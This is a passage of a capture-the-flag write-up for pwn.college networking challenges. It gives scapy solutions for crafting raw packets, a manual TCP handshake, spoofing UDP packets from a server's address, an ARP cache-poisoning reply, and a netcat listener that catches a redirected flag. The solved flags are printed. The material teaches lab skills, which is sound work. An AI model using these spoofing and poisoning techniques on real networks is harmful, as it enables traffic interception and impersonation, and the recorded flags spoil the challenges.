        TX packets 9  bytes 726 (726.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```python
>>> Ether(src="42:5a:15:d0:61:a3", dst="ff:ff:ff:ff:ff:ff", type=0xFFFF).display()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = 42:5a:15:d0:61:a3
  type      = 0xffff
```

Now that we have a valid Ethernet packet, we just have to send it over.

```py
>>> sendp(Ether(src="42:5a:15:d0:61:a3", dst="ff:ff:ff:ff:ff:ff", type=0xFFFF), iface="eth0")
.
Sent 1 packets.
pwn.college{YApxHV8YC_dydQ2cfeE93_ZIgfi.dZjNzMDL4ITM0EzW}
```

The remote host is connected to the `eth0` interface, so we send the packets out of the `eth0` interface.

&nbsp;

## IP

> Manually send an Internet Protocol packet. The packet should have `IP proto=0xFF`. The packet should be sent to the remote host at `10.0.0.2`.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os

import psutil
import scapy.all as scapy
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class RawPacketHost(Host):
    def entrypoint(self):
        scapy.conf.ifaces.reload()
        scapy.sniff(prn=self.handle_packet, iface="eth0")

    def handle_packet(self, packet):
        if "IP" not in packet:
            return
        if packet["IP"].proto == 0xFF:
            print(flag, flush=True)

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
raw_packet_host = RawPacketHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", raw_packet_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

```
root@ip-10-0-0-1:/# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::f497:f7ff:fe5f:eea9  prefixlen 64  scopeid 0x20<link>
        ether f6:97:f7:5f:ee:a9  txqueuelen 1000  (Ethernet)
        RX packets 28  bytes 2276 (2.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9  bytes 726 (726.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We can encapsulate a packet within another packet using the `/` separator.

```py
>>> (Ether(src="f6:97:f7:5f:ee:a9", dst="ff:ff:ff:ff:ff:ff") / IP()).display()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = f6:97:f7:5f:ee:a9
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = hopopt
     chksum    = None
     src       = 127.0.0.1
     dst       = 127.0.0.1
     \options   \
```

Now we just have to fill the correct fields.

```py
>>> (Ether(src="f6:97:f7:5f:ee:a9", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.1", dst="10.0.0.2", proto=0xFF)).display()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = f6:97:f7:5f:ee:a9
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = 255
     chksum    = None
     src       = 10.0.0.1
     dst       = 10.0.0.2
     \options   \
```

```py
>>> sendp(Ether(src="f6:97:f7:5f:ee:a9", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.1", dst="10.0.0.2", proto=0xFF), iface="eth0")
.
Sent 1 packets.
pwn.college{kNuF6XCFRDDJxedKpxAlQ9yb0uV.ddjNzMDL4ITM0EzW}
```

&nbsp;

## TCP

> Manually send a Transmission Control Protocol packet. The packet should have `TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF`. The packet should be sent to the remote host at `10.0.0.2`.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os

import psutil
import scapy.all as scapy
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class RawPacketHost(Host):
    def entrypoint(self):
        scapy.conf.ifaces.reload()
        scapy.sniff(prn=self.handle_packet, iface="eth0")

    def handle_packet(self, packet):
        if "TCP" not in packet:
            return
        if (packet["TCP"].sport == 31337 and packet["TCP"].dport == 31337 and
            packet["TCP"].seq == 31337 and packet["TCP"].ack == 31337 and
            packet["TCP"].flags == "APRSF"):
            print(flag, flush=True)

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
raw_packet_host = RawPacketHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", raw_packet_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

```
root@ip-10-0-0-1:/# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::8458:acff:fe24:7e03  prefixlen 64  scopeid 0x20<link>
        ether 86:58:ac:24:7e:03  txqueuelen 1000  (Ethernet)
        RX packets 31  bytes 2486 (2.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 796 (796.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We have to add another layer of encapsulation, which is TCP.

```py
>>> (Ether(src="86:58:ac:24:7e:03", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.1", dst="10.0.0.2") / TCP()).display()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = 86:58:ac:24:7e:03
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = None
     src       = 10.0.0.1
     dst       = 10.0.0.2
     \options   \
###[ TCP ]###
        sport     = ftp_data
        dport     = http
        seq       = 0
        ack       = 0
        dataofs   = None
        reserved  = 0
        flags     = S
        window    = 8192
        chksum    = None
        urgptr    = 0
        options   = []
```

Let's fill the correct fields.

```py
>>> (Ether(src="86:58:ac:24:7e:03", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")).display()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = 86:58:ac:24:7e:03
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = None
     src       = 10.0.0.1
     dst       = 10.0.0.2
     \options   \
###[ TCP ]###
        sport     = 31337
        dport     = 31337
        seq       = 31337
        ack       = 31337
        dataofs   = None
        reserved  = 0
        flags     = FSRPA
        window    = 8192
        chksum    = None
        urgptr    = 0
        options   = []
```

```py
>>> sendp(Ether(src="86:58:ac:24:7e:03", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF"), iface="eth0")
.
Sent 1 packets.
pwn.college{8StjcaVle85KYtysso8f0NwHhkx.dhjNzMDL4ITM0EzW}
```

&nbsp;

## TCP Handshake

> Manually perform a Transmission Control Protocol handshake. The initial packet should have `TCP sport=31337, dport=31337, seq=31337`. The handshake should occur with the remote host at `10.0.0.2`.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import random
import subprocess

import psutil
import scapy.all as scapy
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

def drop_rst_packets(sport):
    subprocess.run(["/usr/sbin/iptables",
                    "-A", "OUTPUT",
                    "-p", "tcp",
                    "--tcp-flags", "RST", "RST",
                    "--sport", str(sport),
                    "-j", "DROP"],
                   stdin=subprocess.DEVNULL,
                   capture_output=True,
                   check=True)

class RawPacketHost(Host):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.seq = None

    def entrypoint(self):
        scapy.conf.ifaces.reload()
        scapy.conf.route.resync()
        drop_rst_packets(31337)
        scapy.sniff(prn=self.handle_packet, iface="eth0")

    def handle_packet(self, packet):
        if "TCP" not in packet:
            return
        if not (packet["TCP"].sport == 31337 and packet["TCP"].dport == 31337):
            return

        if packet["TCP"].seq == 31337 and packet["TCP"].flags == "S":
            self.seq = random.randrange(0, 2**32)
            response_packet = (scapy.IP(src=packet["IP"].dst, dst=packet["IP"].src) /
                               scapy.TCP(sport=packet["TCP"].dport, dport=packet["TCP"].sport,
                                         seq=self.seq, ack=(packet["TCP"].seq + 1) % (2**32),
                                         flags="SA"))
            scapy.send(response_packet, verbose=False)

        if (packet["TCP"].seq == (31337 + 1) and
            packet["TCP"].ack == ((self.seq + 1) % (2**32)) and
            packet["TCP"].flags == "A"):
            print(flag, flush=True)

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
raw_packet_host = RawPacketHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", raw_packet_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.exec(lambda: drop_rst_packets(31337))

user_host.interactive(environ=parent_process.environ())
```

A TCP handshake is really just a sequence of packets that establishes a secure and reliable connection between two devices.

It includes three packets:

1. SYN
2. SYN-ACK
3. ACK

```
root@ip-10-0-0-1:/# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::3883:caff:fe64:a488  prefixlen 64  scopeid 0x20<link>
        ether 3a:83:ca:64:a4:88  txqueuelen 1000  (Ethernet)
        RX packets 18  bytes 1536 (1.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6  bytes 516 (516.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We have to first send a SYN packet, represented by `S` as the flag.

```py
>>> (Ether(src="3a:83:ca:64:a4:88", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, flags="S")).display()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = 3a:83:ca:64:a4:88
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = None
     src       = 10.0.0.1
     dst       = 10.0.0.2
     \options   \
###[ TCP ]###
        sport     = 31337
        dport     = 31337
        seq       = 31337
        ack       = 0
        dataofs   = None
        reserved  = 0
        flags     = S
        window    = 8192
        chksum    = None
        urgptr    = 0
        options   = []
```

We can send the packet over using `srp`.

```py
>>> response = srp(Ether(src="3a:83:ca:64:a4:88", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, flags="S"), iface="eth0")
Begin emission

Finished sending 1 packets
.*
Received 2 packets, got 1 answers, remaining 0 packets
```

Let's look at the response from the host at `10.0.0.2`.

```py
>>> response[0][0]
QueryAnswer(
    query=<Ether  dst=ff:ff:ff:ff:ff:ff src=3a:83:ca:64:a4:88 type=IPv4 |<IP  frag=0 proto=tcp src=10.0.0.1 dst=10.0.0.2 |<TCP  sport=31337 dport=31337 seq=31337 flags=S |>>>,
    answer=<Ether  dst=3a:83:ca:64:a4:88 src=32:ed:40:fe:96:eb type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=1 flags= frag=0 ttl=64 proto=tcp chksum=0x66cd src=10.0.0.2 dst=10.0.0.1 |<TCP  sport=31337 dport=31337 seq=24000824 ack=31338 dataofs=5 reserved=0 flags=SA window=8192 chksum=0xd1ec urgptr=0 |>>>
)
```

As we can see, the response has `seq` field set to `24000824` and the `ack` field set to `31338` which is our `seq+1`.
So the host at `10.0.0.2` has acknowledged our SYN packet. Now we have to acknowledge theirs by setting our `ack` field to `24000825` which is their `seq+1`.

We also have to set the flag to `A`, which represents an ACK packet.

We also know the MAC address of the host at `10.0.0.2`, `32:ed:40:fe:96:eb`.

```py
>>> sendp(Ether(src="3a:83:ca:64:a4:88", dst="32:ed:40:fe:96:eb") / IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31338, ack=24000825, flags="A"), iface="eth0")
.
Sent 1 packets.
pwn.college{MFeq4__GaD1i7X6t5G_hJxNRVsy.dljNzMDL4ITM0EzW}
```

&nbsp;

## UDP

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import psutil
import socket
import os

from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_socket.bind(("0.0.0.0", 31337))
        while True:
            try:
                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
                if client_message == b"Hello, World!\n":
                    server_socket.sendto(flag.encode(), (client_host, client_port))
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

Let's craft a UDP packet.

```py
>>> (IP(dst="10.0.0.2") / UDP(sport=31337, dport=31337)).display()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = None
  src       = 10.0.0.1
  dst       = 10.0.0.2
  \options   \
###[ UDP ]###
     sport     = 31337
     dport     = 31337
     len       = None
     chksum    = None
```

```py
>>> sr1(IP(dst="10.0.0.2") / UDP(sport=31337, dport=31337) / Raw(load="Hello, World!\n"))
Begin emission
.
Finished sending 1 packets
*
Received 2 packets, got 1 answers, remaining 0 packets
<IP  version=4 ihl=5 tos=0x0 len=88 id=42364 flags=DF frag=0 ttl=64 proto=udp chksum=0x8116 src=10.0.0.2 dst=10.0.0.1 |<UDP  sport=31337 dport=31337 len=68 chksum=0x1458 |<Raw  load=b'pwn.college{IyEug8PTvV4SRHm8XPCrNxSUihI.QXyQDM2EDL4ITM0EzW}\n' |>>>
```

&nbsp;

## UDP 2

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import psutil
import socket
import os

from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_socket.bind(("0.0.0.0", 31337))
        while True:
            try:
                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
                if client_port == 31338 and client_message == b"Hello, World!\n":
                    server_socket.sendto(flag.encode(), (client_host, client_port))
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

Let's craft a UDP packet.

```py
>>> (IP(dst="10.0.0.2") / UDP(sport=31338, dport=31337)).display()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = None
  src       = 10.0.0.1
  dst       = 10.0.0.2
  \options   \
###[ UDP ]###
     sport     = 31338
     dport     = 31337
     len       = None
     chksum    = None
```

```py
>>> sr1(IP(dst="10.0.0.2") / UDP(sport=31338, dport=31337) / Raw(load="Hello, World!\n"))
Begin emission
.
Finished sending 1 packets
*
Received 2 packets, got 1 answers, remaining 0 packets
<IP  version=4 ihl=5 tos=0x0 len=88 id=33942 flags=DF frag=0 ttl=64 proto=udp chksum=0xa1fc src=10.0.0.2 dst=10.0.0.1 |<UDP  sport=31337 dport=31338 len=68 chksum=0x1458 |<Raw  load=b'pwn.college{Mwz35MI1J6GMKGojDTxm77Allz1.QXzQDM2EDL4ITM0EzW}\n' |>>>
```

&nbsp;

## UDP Spoofing 1

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import psutil
import socket
import time
import os

from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_socket.bind(("0.0.0.0", 31337))
        while True:
            try:
                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
                if client_message.strip() == b"ACTION?":
                    server_socket.sendto(b"NONE", (client_host, client_port))
            except ConnectionError:
                continue

class ClientHost(Host):
    def entrypoint(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client_socket.bind(("0.0.0.0", 31338))
        while True:
            try:
                client_socket.sendto(b"ACTION?", ("10.0.0.3", 31337))
                message, (peer_host, peer_port) = client_socket.recvfrom(1024)
                if peer_port == 31337 and message.strip() == b"FLAG":
                    print(f"YOUR FLAG: {flag}")

                time.sleep(1)
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = ClientHost("ip-10-0-0-2")
server_host = ServerHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2", server_host: "10.0.0.3"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

This challenge sets up a virtual network with a client that repeatedly asks a server for an `"ACTION?"` via UDP, expecting a `"FLAG"` response to print the flag. Since the server only replies with `"NONE"`, the goal is to spoof a UDP packet from the server's IP and port to trick the client into printing the flag.

```py
>>> (IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG")).display()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = None
  src       = 10.0.0.3
  dst       = 10.0.0.2
  \options   \
###[ UDP ]###
     sport     = 31337
     dport     = 31338
     len       = None
     chksum    = None
###[ Raw ]###
        load      = b'FLAG'
```

```py
>>> send(IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG"))
.
Sent 1 packets.
>>> YOUR FLAG: pwn.college{UuowlpVF-BCfmk1CyhSy_9aopeC.QX0QDM2EDL4ITM0EzW}
```

&nbsp;

## UDP Spoofing 2

### Source code 
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import psutil
import socket
import time
import os

from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_socket.bind(("0.0.0.0", 31337))
        while True:
            try:
                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
                if client_message.strip() == b"ACTION?":
                    server_socket.sendto(b"NONE", (client_host, client_port))
            except ConnectionError:
                continue

class ClientHost(Host):
    def entrypoint(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client_socket.bind(("0.0.0.0", 31338))
        while True:
            time.sleep(1)
            try:
                client_socket.sendto(b"ACTION?", ("10.0.0.3", 31337))
                message, (peer_host, peer_port) = client_socket.recvfrom(1024)
                if peer_port == 31337 and message.startswith(b"FLAG"):
                    _, flag_host, flag_port = message.strip().split(b":")
                    client_socket.sendto(flag.encode(), (flag_host, int(flag_port)))
            except (ConnectionError, ValueError):
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = ClientHost("ip-10-0-0-2")
server_host = ServerHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2", server_host: "10.0.0.3"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

The challenge sets up a virtual network where a client periodically sends `"ACTION?"` to a server over UDP, and if it ever receives a `FLAG:ip:port` response, it sends the actual flag to that address.
Our goal is to trick the client into sending us the flag by spoofing a UDP packet from the server with our IP and port.

We will have to put the listener in the background, and then send the packet in the same shell. If we split our terminal, the sessions are treated as separate and the MAC address of teh host is different.

```
root@ip-10-0-0-1:/# nc -u -lvp 9999 &
[1] 785
```

```py
>>> (IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG:10.0.0.1:9999")).display()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = None
  src       = 10.0.0.3
  dst       = 10.0.0.2
  \options   \
###[ UDP ]###
     sport     = 31337
     dport     = 31338
     len       = None
     chksum    = None
###[ Raw ]###
        load      = b'FLAG:10.0.0.1:9999'
```

```py
>>> send(IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG:10.0.0.1:9999"))
.
Sent 1 packets.
>>> nc: getnameinfo: Temporary failure in name resolution
pwn.college{Qa7I7oqR_1wCI546RKLcU_CW77L.QX1QDM2EDL4ITM0EzW}
```

&nbsp;

## UDP Spoofing 3

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import psutil
import socket
import time
import os

from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_socket.bind(("0.0.0.0", 31337))
        while True:
            try:
                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
                if client_message.strip() == b"ACTION?":
                    server_socket.sendto(b"NONE", (client_host, client_port))
            except ConnectionError:
                continue

class ClientHost(Host):
    def entrypoint(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            time.sleep(1)
            try:
                client_socket.sendto(b"ACTION?", ("10.0.0.3", 31337))
                message, (peer_host, peer_port) = client_socket.recvfrom(1024)
                if peer_port == 31337 and message.startswith(b"FLAG"):
                    _, flag_host, flag_port = message.strip().split(b":")
                    client_socket.sendto(flag.encode(), (flag_host, int(flag_port)))
            except (ConnectionError, ValueError):
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = ClientHost("ip-10-0-0-2")
server_host = ServerHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2", server_host: "10.0.0.3"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

&nbsp;

## UDP Spoofing 4

&nbsp;

## ARP

> Manually send an Address Resolution Protocol packet. The packet should inform the remote host that the IP address `10.0.0.42` can be found at the Ethernet address `42:42:42:42:42:42`. The packet should be sent to the remote host at `10.0.0.2`.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os

import psutil
import scapy.all as scapy
from dojjail import Host, Network

WHO_HAS = 1
IS_AT = 2

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class RawPacketHost(Host):
    def entrypoint(self):
        scapy.conf.ifaces.reload()
        scapy.sniff(prn=self.handle_packet, iface="eth0")

    def handle_packet(self, packet):
        if "ARP" not in packet:
            return
        if (packet["ARP"].psrc == "10.0.0.42" and packet["ARP"].hwsrc == "42:42:42:42:42:42" and
            packet["ARP"].op == IS_AT):
            print(flag, flush=True)

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
raw_packet_host = RawPacketHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", raw_packet_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

```
root@ip-10-0-0-1:/# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::9c52:48ff:fe85:bab6  prefixlen 64  scopeid 0x20<link>
        ether 9e:52:48:85:ba:b6  txqueuelen 1000  (Ethernet)
        RX packets 18  bytes 1556 (1.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 426 (426.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We need to tell the host at `10.0.0.2` that we have the IP address that they want to talk to. For that we need to send an ARP `is-at` response.

Note that ARP encapsulates an Ethernet frame.

```py
>>> ARP().display()
WARNING: No route found for IPv4 destination 0.0.0.0 (no default route?)
WARNING: No route found for IPv4 destination 0.0.0.0 (no default route?)
###[ ARP ]###
  hwtype    = Ethernet (10Mb)
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = who-has
  hwsrc     = 00:00:00:00:00:00
  psrc      = 0.0.0.0
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0
```

The packet fields represent the following:
- `hwsrc`: Source hardware address. This will be updated in the target's ARP table.
- `psrc`: The IP to be added in the target's ARP table.
- `hwdst`: Destination hardware address.
- `pdst`: Destination where the ARP packet must go.

```py
>>> (Ether(src="9e:52:48:85:ba:b6", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", hwsrc="42:42:42:42:42:42", psrc="10.0.0.42", hwdst="ff:ff:ff:ff:ff:ff", pdst="10.0.0.2")).display()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = 9e:52:48:85:ba:b6
  type      = ARP
###[ ARP ]###
     hwtype    = Ethernet (10Mb)
     ptype     = IPv4
     hwlen     = None
     plen      = None
     op        = is-at
     hwsrc     = 42:42:42:42:42:42
     psrc      = 10.0.0.42
     hwdst     = ff:ff:ff:ff:ff:ff
     pdst      = 10.0.0.2
```

```py
>>> sendp(Ether(src="9e:52:48:85:ba:b6", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", hwsrc="42:42:42:42:42:42", psrc="10.0.0.42", hwdst="ff:ff:ff:ff:ff:ff", pdst="10.0.0.2"), iface="eth0")
.
Sent 1 packets.
pwn.college{wP575ocvtjd1WArdmPDG-QiQlAy.dBzNzMDL4ITM0EzW}
```

&nbsp;

## Intercept

> Intercept traffic from a remote host. The remote host at `10.0.0.2` is communicating with the remote host at `10.0.0.3` on port `31337`.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))
                client_socket.sendall(flag.encode())
                client_socket.close()
            except (OSError, ConnectionError, TimeoutError):
                continue

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.recv(1024)
                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = ClientHost("ip-10-0-0-2")
server_host = ServerHost("ip-10-0-0-3")
